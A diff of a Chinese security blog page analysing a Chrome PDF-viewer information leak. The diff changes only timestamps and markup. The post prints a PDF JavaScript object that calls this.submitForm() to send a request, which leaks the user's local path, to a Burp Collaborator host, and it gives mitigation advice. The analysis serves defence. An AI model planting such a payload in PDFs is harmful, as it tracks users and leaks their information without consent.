@@ -90,7 +90,7 @@
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1551431921293.jpg">
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1551432135413.jpg">
 <meta property="og:image" content="http://pic.giantbranch.cn/pic/1551432214825.jpg">
-<meta property="og:updated_time" content="2019-05-24T15:07:13.280Z">
+<meta property="og:updated_time" content="2019-06-17T12:14:45.674Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Chrome浏览器打开PDF文件信息泄露漏洞简析">
 <meta name="twitter:description" content="edgespot在2月26日在他们的博客上报告了这个问题，今天我了看了下，简单记录一下 背景自2018年12月下旬以来，EdgeSpot已经在野外检测到多个PDF样本，这些样本利用谷歌浏览器未修补的漏洞。使用Google Chrome作为本地PDF查看器时，假如成功利用漏洞，可以跟踪用户并收集一些用户信息。  简析我下载了一些样本，查看了下，是在pdf中嵌入了JavaScript，JavaScri">
@@ -388,7 +388,8 @@
 <h1 id="简析"><a href="#简析" class="headerlink" title="简析"></a>简析</h1><p>我下载了一些样本，查看了下，是在pdf中嵌入了JavaScript，JavaScript有些是没有加密的，有些是zip的压缩算法加密（即FlateDecode），可以使用zlib库解密</p>
 <p>原理很简单，就是利用this.submitForm()这个PDF Javascript API，将发送一个POST请求，请求正文包含一个FDF格式的文件，其中里面泄露用户的路径</p>
 <p>关键js代码如下（下面贴一个简单的js）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">9 0 obj</div><div class="line">&lt;&lt;</div><div class="line">/S/JavaScript/JS(</div><div class="line">	if\(this.submitForm\)&#123;</div><div class="line">		this.submitForm\(&apos;http://zuxjk0dftoamimorjl9dfhr44vap3fr7ovgi76w.burpcollaborator.net&apos;\);</div><div class="line">		app.alert\(&quot;Script executed&quot;\);</div><div class="line">	&#125;</div><div class="line">)</div><div class="line">/Next&lt;&lt;/F&lt;&lt;/F 10 0 R/FS/URL&gt;&gt;/S/SubmitForm&gt;&gt;</div><div class="line">&gt;&gt;</div><div class="line">endobj</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">9 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">/S/JavaScript/JS(</span><br><span class="line">	if\(this.submitForm\)&#123;</span><br><span class="line">		this.submitForm\(&apos;http://zuxjk0dftoamimorjl9dfhr44vap3fr7ovgi76w.burpcollaborator.net&apos;\);</span><br><span class="line">		app.alert\(&quot;Script executed&quot;\);</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line">/Next&lt;&lt;/F&lt;&lt;/F 10 0 R/FS/URL&gt;&gt;/S/SubmitForm&gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure>
+
 <p>我将上面的url改为我自己的服务器地址192.168.XXX.XXX，下面是我抓包的结果</p>
 <p><img src="http://pic.giantbranch.cn/pic/1551431921293.jpg" alt></p>
 <p>那么攻击者可以得到的信息有</p>
@@ -398,7 +399,7 @@
 <p><img src="http://pic.giantbranch.cn/pic/1551432214825.jpg" alt></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>试了一下，这个不止是chrome浏览器受影响，360浏览器也受影响，那么应该是使用chromium内核的都受影响了。</p>
 <p>建议：打开pdf用其他pdf查看器，不建议打开来路不明的pdf，保险一点的可以使用网盘等在线的查看器查看</p>
-<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.anquanke.com/post/id/172035" target="_blank" rel="external">https://www.anquanke.com/post/id/172035</a><br><a href="https://blog.edgespot.io/2019/02/edgespot-detects-pdf-zero-day-samples.html" target="_blank" rel="external">https://blog.edgespot.io/2019/02/edgespot-detects-pdf-zero-day-samples.html</a></p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.anquanke.com/post/id/172035" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172035</a><br><a href="https://blog.edgespot.io/2019/02/edgespot-detects-pdf-zero-day-samples.html" target="_blank" rel="noopener">https://blog.edgespot.io/2019/02/edgespot-detects-pdf-zero-day-samples.html</a></p>
 
       
     </div>
